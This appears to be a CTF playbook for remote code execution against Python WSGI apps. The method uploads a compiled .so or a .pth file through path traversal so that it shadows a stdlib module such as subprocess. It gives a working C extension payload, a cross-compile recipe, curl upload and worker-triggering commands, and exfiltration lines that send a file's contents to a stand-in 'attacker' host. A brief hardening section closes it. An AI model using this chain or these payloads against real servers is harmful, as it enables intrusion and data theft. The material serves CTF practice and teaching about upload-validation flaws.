# File Upload — Python module shadowing via `.so` (and `.pth`)

## When this applies

- Target is a **Python WSGI app** (Flask/FastAPI/Django + gunicorn/uWSGI/uvicorn).
- Upload validator only blocks `.py` and/or `.pyc` (often via substring `if ext in filename`).
- `filename` is concatenated into the destination path (`os.path.join`, `Path() / filename`, f-string) **without** `secure_filename` / basename stripping — so path traversal can land files outside the upload dir.
- WSGI process `cwd` is writable from the upload dir via `../` (very common — Dockerfile leaves `/app` chowned to the app user with `0777` perms, or just the dropped sources are 777).
- Workers are forked **without `--preload`** (the default), so each fresh worker `import`s lazily on its first request.

## Why the bypass works

| Loader hook | Suffixes Python looks for | Contains `.py` substring? |
|---|---|---|
| `SourceFileLoader` | `.py` | yes (blocked) |
| `SourcelessFileLoader` | `.pyc` | yes (blocked) |
| `ExtensionFileLoader` | `.so`, `.abi3.so`, `.cpython-3XX-<triplet>.so` | **no** — `.cpython` starts with `.c`, not `.py` |
| Site `addsitedir` | `.pth` | **no** |

Both `.so` and `.pth` are **executed at import time** but contain neither `.py` nor `.pyc` substring. A naive `if '.py' in filename` blacklist misses them entirely.

CWD `''` is `sys.path[0]` for `gunicorn` (because supervisord / its launch script sets `directory=/app` and gunicorn doesn't override). So a file at `/app/<name>.so` is loaded **before** the stdlib `<name>` when something imports it the first time inside that worker.

## Pick a target module to shadow

Pick a stdlib top-level module that is **imported lazily during request handling**, not at app startup (otherwise `--preload` or eager imports beat you to it). Trace candidates per stack:

| App stack | Best shadow targets |
|---|---|
| Flask + Pillow image processing | `subprocess` (PIL `GifImagePlugin`/`JpegImagePlugin` import it lazily on first `Image.open/save`) |
| Anything with `requests` / `urllib3` | `ssl`, `select`, `http` |
| Multipart / file ops | `mimetypes`, `email`, `tempfile` |
| Background jobs / spawn | `multiprocessing`, `_posixsubprocess` |

Quick recon to confirm a target is fresh-per-worker:

```python
# Drop into a copy of the app locally and run:
import sys, importlib
import yourapp.wsgi    # whatever gunicorn imports
print("subprocess" in sys.modules)   # must be False
```

If it's True at startup, it's already cached → won't shadow on requests. Pick another module.

## Payload — minimal Python C extension

```c
#define PY_SSIZE_T_CLEAN
#include <Python.h>
#include <stdio.h>
static void payload(void) {
    /* runs once, in-process, as the gunicorn worker user */
    FILE *f = fopen("/app/flag.txt", "r");
    if (!f) return;
    char b[4096]; size_t n = fread(b,1,sizeof(b)-1,f); b[n]=0; fclose(f);
    FILE *o = fopen("/app/uploads/flag_resized.txt", "w");
    if (o) { fwrite(b,1,n,o); fclose(o); }
}
static PyMethodDef M[] = {{NULL,NULL,0,NULL}};
static struct PyModuleDef md = {PyModuleDef_HEAD_INIT,"subprocess",NULL,-1,M};
PyMODINIT_FUNC PyInit_subprocess(void){ payload(); return PyModule_Create(&md); }
```

> The exported init symbol **must** match `PyInit_<modname>` — if you shadow `ssl`, name the function `PyInit_ssl`. Otherwise Python raises `ImportError: dynamic module does not define module export function`.

## Cross-compile recipe (HTB / most CTF challenges = `linux/amd64`)

Your dev host is usually arm64 (Apple Silicon). Use Docker to build the matching arch:

```bash
docker run --rm --platform=linux/amd64 -v "$PWD":/w -w /w python:3.12 bash -c '
  apt-get update -qq && apt-get install -y -qq gcc
  PYINC=$(python3 -c "import sysconfig; print(sysconfig.get_path(\"include\"))")
  gcc -shared -fPIC -I$PYINC evil.c -o evil.so
'
file evil.so
# → ELF 64-bit LSB shared object, x86-64, dynamically linked
```

Match the **CPython version** of the target (3.12 here) so the `Py_*` ABI lines up; `--platform` controls glibc + arch.

## Drop the `.so` via the upload primitive

The filename you send becomes the eventual on-disk name. Two requirements:

1. **Bypass the blacklist** — no `.py` / `.pyc` substring. `subprocess.cpython-312-x86_64-linux-gnu.so` is clean (the `.c` after `subprocess.` is the only thing that touches a dot).
2. **Land in a sys.path directory** — usually `cwd` = `/app`. Use `../` from `/app/uploads/`.

```bash
curl -X POST \
  -F "file=@evil.so;filename=../subprocess.cpython-312-x86_64-linux-gnu.so;type=image/png" \
  http://target/resize
# expected: HTTP 500 (downstream image processing fails on a non-image .so)
# side effect: file is on disk at /app/subprocess.cpython-312-x86_64-linux-gnu.so
```

The HTTP 500 doesn't matter — `file.save()` runs **before** the resize try/except.

## Hit fresh workers

With `--workers N` and no `--preload`, the worker that handled your upload imported `subprocess` (real one, cached). The other `N-1` workers haven't yet. Fan out:

```bash
for i in $(seq 1 $((N*8))); do
  curl -s -X POST -F "file=@tiny.png;filename=trig_$i.png;type=image/png" \
    http://target/resize -o /dev/null &
done; wait
```

Each new worker's first request triggers `import subprocess` → CWD finder hits your `.so` first → `PyInit_subprocess()` runs your payload.

## Read the result back

When the only egress is `send_file(<server-built path>)`, **write your output to the predicted path**.

For the Resizer pattern (`new_resize_path = filepath.rsplit('.',1)[0] + '_resized.' + filepath.rsplit('.',1)[1]`):

```bash
# Payload wrote /app/uploads/flag_resized.txt; trigger send_file by sending filename=flag.txt
curl -X POST -F "file=@tiny.png;filename=flag.txt;type=image/png" http://target/resize
# response body == flag.txt contents
```

Other read-back primitives (pick whichever the app exposes):
- Response headers: set `Server-Timing` or a custom `X-Pwn` header from within the .so (via `setenv` is too late; better: write a file).
- DNS exfil: `system("curl http://attacker/$(cat /app/flag.txt|base64)")` from the .so.
- Reverse shell: classic `dup2` + `execve("/bin/sh", …)`.

## Alternative: `.pth` (no compile needed)

If `site-packages` (or any sitedir loaded via `addsitedir`) is writable, drop a `.pth`:

```
# evil.pth  — Python evaluates lines that begin with import statements at site init
import os; os.system('curl http://attacker/$(cat /app/flag.txt|base64 -w0)')
```

`.pth` doesn't trigger at request time though — it runs at **Python startup**. You need either a worker restart trigger (`gunicorn --max-requests`, OOM, crash) or you must have planted it before app start. Less useful for live CTF unless you can also crash a worker.

## Hardening (notes for write-ups)

- Use `secure_filename(file.filename)` from `werkzeug.utils` — strips path separators and special chars.
- Anchor the destination with `os.path.realpath(os.path.join(UPLOAD_DIR, name)).startswith(UPLOAD_DIR + os.sep)`.
- Whitelist extensions, don't blacklist.
- Run gunicorn with `--preload` so all imports happen in the master before fork; shadows planted after fork are no longer effective.
- Drop `/app` and its contents to `0755` / `0644` instead of `0777`.

## Real-world reference

- HTB **Resizer** (Web, Hard, 2026-04-17) — exact chain documented above. `Pillow 10.2.0` + `gunicorn 5 workers` + `if '.py' in filename` blacklist.
